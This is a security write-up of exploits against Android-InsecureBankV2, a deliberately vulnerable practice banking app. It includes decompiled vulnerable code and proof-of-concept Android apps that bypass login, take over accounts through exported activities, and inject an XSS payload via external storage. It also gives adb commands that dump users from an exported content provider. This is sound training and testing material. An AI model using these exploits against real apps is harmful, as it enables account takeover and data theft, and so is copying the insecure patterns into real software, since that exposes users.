# B3nac Android-InsecureBankV2 write-up

This is not all the possible vulnerabilities only some of the more severe findings. I definitely recommend this app for practice, it was a lot of fun to exploit. Great job Dinesh Shetty!

Android-InsecureBankV2 can be found here [https://github.com/dineshshetty/Android-InsecureBankv2](https://github.com/dineshshetty/Android-InsecureBankv2).

## PostLogin Activity

### Login as existing user without inputing password

```xml
<activity android:label="@string/title_activity_post_login" android:name="com.android.insecurebankv2.PostLogin" android:exported="true"/>
```

The vulnerable variable that can be changed via user input. This variable occurs throughout most of the exported activites and other components.

`this.uname = getIntent().getStringExtra("uname");`

```java

package b3nac.injuredandroid.poc;

import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent start = new Intent();
        start.setClassName("com.android.insecurebankv2", "com.android.insecurebankv2.PostLogin");
        start.putExtra("uname", "jack");

        startActivity(start);
    }

}
```

---


## DoTransfer Activity

### Credentials are passed over http/plaintext

```xml
<activity android:label="@string/title_activity_do_transfer" android:name="com.android.insecurebankv2.DoTransfer" android:exported="true"/>

```

Vulnerable code:

```java
public String doInBackground(String... params) {
            HttpClient httpclient = new DefaultHttpClient();
            HttpPost httppost = new HttpPost(DoTransfer.this.protocol + DoTransfer.this.serverip + ":" + DoTransfer.this.serverport + "/dotransfer");
            SharedPreferences settings = DoTransfer.this.getSharedPreferences("mySharedPreferences", 0);
            byte[] usernameBase64Byte = Base64.decode(settings.getString("EncryptedUsername", (String) null), 0);
            try {
                DoTransfer.this.usernameBase64ByteString = new String(usernameBase64Byte, "UTF-8");
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
            String password = settings.getString("superSecurePassword", (String) null);
```

---

## ViewStatement Activity

### XSS with provided external storage file

```xml

<activity android:label="@string/title_activity_view_statement" android:name="com.android.insecurebankv2.ViewStatement" android:exported="true"/>

```

Vulnerable code:

```java

this.uname = getIntent().getStringExtra("uname");
        File fileToCheck = new File(Environment.getExternalStorageDirectory(), "Statements_" + this.uname + ".html");
        System.out.println(fileToCheck.toString());
        if (fileToCheck.exists()) {
            WebView mWebView = (WebView) findViewById(R.id.webView1);
            mWebView.loadUrl("file://" + Environment.getExternalStorageDirectory() + "/Statements_" + this.uname + ".html");
            mWebView.getSettings().setJavaScriptEnabled(true);
            mWebView.getSettings().setSaveFormData(true);
            mWebView.getSettings().setBuiltInZoomControls(true);
            mWebView.setWebViewClient(new MyWebViewClient());
            mWebView.setWebChromeClient(new WebChromeClient());
            return;

```

Reads from external storage which is public `getExternalStorageDirectory()` Statements_admin.html

PoC app:

```Java 

package b3nac.injuredandroid.poc;

import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent start = new Intent();
        start.setClassName("com.android.insecurebankv2", "com.android.insecurebankv2.ViewStatement");
        start.putExtra("uname", "jack");

        startActivity(start);
    }

}


```

PoC file `Statements_jack.html`:

```html

<html>
<svg onload=alert('💩')>
</html>

```

---

## ChangePassword Activity

### Account tackover via user accepted intent `uname`

<activity android:label="@string/title_activity_change_password" android:name="com.android.insecurebankv2.ChangePassword" android:exported="true"/>

After providing a user that exists the ChangePassword Activity is presented and you can reset the password to whatever you want.

```java

package b3nac.injuredandroid.poc;

import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent start = new Intent();
        start.setClassName("com.android.insecurebankv2", "com.android.insecurebankv2.ChangePassword");
        start.putExtra("uname", "jack");

        startActivity(start);
    }

}

```

---

## Broadcast receiver MyBroadcastReceiver is accepting user provided variables in broadcast

### Leaks other user passwords via text message due to app needing to restart after password change

```xml
<provider android:name="com.android.insecurebankv2.TrackUserContentProvider" android:exported="true" android:authorities="com.android.insecurebankv2.TrackUserContentProvider"/>
```


Vulnerable code:

```java

public void onReceive(Context context, Intent intent) {
        String phn = intent.getStringExtra("phonenumber");
        String newpass = intent.getStringExtra("newpass");
        if (phn != null) {
            try {
                SharedPreferences settings = context.getSharedPreferences("mySharedPreferences", 1);
                this.usernameBase64ByteString = new String(Base64.decode(settings.getString("EncryptedUsername", (String) null), 0), "UTF-8");
                String decryptedPassword = new CryptoClass().aesDeccryptedString(settings.getString("superSecurePassword", (String) null));
                String textPhoneno = phn.toString();
                String textMessage = "Updated Password from: " + decryptedPassword + " to: " + newpass;
                SmsManager smsManager = SmsManager.getDefault();
                System.out.println("For the changepassword - phonenumber: " + textPhoneno + " password is: " + textMessage);
                smsManager.sendTextMessage(textPhoneno, (String) null, textMessage, (PendingIntent) null, (PendingIntent) null);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            System.out.println("Phone number is null");
        }
    }

```

Broadcast PoC in progress: Doesn't seem to be exploitable with the new Android apis

```java

package b3nac.injuredandroid.poc;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent start = new Intent();

        start.setAction("theBroadcast");
        start.putExtra("phonenumber","11111111111");
        start.putExtra("newpass", "<script>alert(1)</script>");

        sendBroadcast(start);
    }
}

```

---

## TrackUserContentProvider

### Exported ContentProvider discloses all users

```xml

<provider android:name="com.android.insecurebankv2.TrackUserContentProvider" android:exported="true" android:authorities="com.android.insecurebankv2.TrackUserContentProvider"/>

```

Vulnerable code:

Hard coded db information and `content://` paths makes disclosing database information very easy.

```java
public class TrackUserContentProvider extends ContentProvider {
    static final Uri CONTENT_URI = Uri.parse(URL);
    static final String CREATE_DB_TABLE = " CREATE TABLE names (id INTEGER PRIMARY KEY AUTOINCREMENT,  name TEXT NOT NULL);";
    static final String DATABASE_NAME = "mydb";
    static final int DATABASE_VERSION = 1;
    static final String PROVIDER_NAME = "com.android.insecurebankv2.TrackUserContentProvider";
    static final String TABLE_NAME = "names";
    static final String URL = "content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers";
    static final String name = "name";
    static final int uriCode = 1;
    static final UriMatcher uriMatcher = new UriMatcher(-1);
    private static HashMap<String, String> values;
    private SQLiteDatabase db;

    static {
        uriMatcher.addURI(PROVIDER_NAME, "trackerusers", 1);
        uriMatcher.addURI(PROVIDER_NAME, "trackerusers/*", 1);
    }

```

### Adb PoC:

#### Query all users

`adb shell content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers`

Result

```
Row: 0 id=1, name=dinesh
Row: 1 id=2, name=dinesh
Row: 2 id=3, name=jack
Row: 3 id=4, name=jack
Row: 4 id=5, name=jack
```

`adb shell content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers --projection *:* --where "name=\'jack\'"`

Result

```
Row: 0 id=3, name=jack, id=3, name=jack
Row: 1 id=4, name=jack, id=4, name=jack
Row: 2 id=5, name=jack, id=5, name=jack

```

The content provider does not have db write permission so injecting data isn't allowed. 

